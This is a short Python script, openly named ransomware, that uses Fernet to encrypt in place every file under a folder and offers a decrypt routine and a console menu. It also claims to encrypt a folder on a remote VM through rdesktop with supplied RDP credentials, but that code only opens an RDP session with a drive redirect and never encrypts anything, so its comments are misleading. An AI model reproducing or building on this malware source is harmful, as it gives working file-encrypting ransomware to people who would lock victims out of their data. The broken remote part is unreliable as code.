import os
import subprocess
from cryptography.fernet import Fernet

# Functions to write key and load key
def write_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def load_key():
    return open("key.key", "rb").read()


class Ransomware:
    def __init__(self):
        self.sysRoot = os.path.expanduser('~')
        if not os.path.exists("key.key"):
            write_key()
        self.key = load_key()

    # Encrypt all files in a folder on a different VM using RDP (rdesktop)
    def encrypt_folder_on_vm(self, target_vm_ip, folder_path, rdp_username, rdp_password):
        rdp_command = f"rdesktop -u {rdp_username} -p {rdp_password} {target_vm_ip}"
        subprocess.Popen(rdp_command, shell=True)

        # Wait for RDP connection to be established
        input("Press Enter once the RDP connection is established.")

        # Encrypt files on the target VM
        encrypt_command = f'rdesktop {target_vm_ip} -u {rdp_username} -p {rdp_password} -r "disk:Shared={folder_path}" -a 16-bit -g 1024x768 -x l'
        subprocess.run(encrypt_command, shell=True)

    def encrypt_folder(self, folder_path):
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                with open(file_path, 'rb') as f:
                    data = f.read()

                fernet = Fernet(self.key)
                encrypted = fernet.encrypt(data)

                with open(file_path, 'wb') as f:
                    f.write(encrypted)

        print("Encryption completed.")

    # Decrypt files using the Fernet symmetric key
    def decrypt_folder(self, folder_path):
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                with open(file_path, 'rb') as f:
                    data = f.read()

                fernet = Fernet(self.key)
                decrypted = fernet.decrypt(data)

                with open(file_path, 'wb') as f:
                    f.write(decrypted)

        print("Decryption completed.")


# Create an instance of the Ransomware class
ransomware = Ransomware()

# Add choices at the bottom
print("Choose an action:")
print("1. Encrypt folder on a different VM")
print("2. Decrypt folder")
choice = input("Enter your choice (1/2): ")

if choice == "1":
    target_vm_ip = input("Enter the target VM IP: ")
    folder_path = input("Enter the folder path to encrypt on the target VM: ")
    rdp_username = input("Enter your RDP username: ")
    rdp_password = input("Enter your RDP password: ")
    ransomware.encrypt_folder_on_vm(target_vm_ip, folder_path, rdp_username, rdp_password)
elif choice == "2":
    folder_path = input("Enter the folder path to decrypt: ")
    ransomware.decrypt_folder(folder_path)
else:
    print("Invalid choice. Please choose a valid option.")
